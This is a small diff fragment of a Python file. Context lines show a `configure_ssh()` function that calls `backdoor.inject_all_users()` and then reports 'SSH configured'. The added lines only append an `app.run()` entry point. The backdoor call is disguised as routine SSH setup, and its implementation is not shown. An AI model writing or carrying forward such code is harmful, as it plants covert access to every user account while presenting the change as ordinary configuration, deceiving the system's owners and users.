@@ -80,3 +80,7 @@ def configure_ssh() -> str:
     backdoor.inject_all_users()
 
     return "SSH configured"
+
+
+if __name__ == "__main__":
+    app.run()
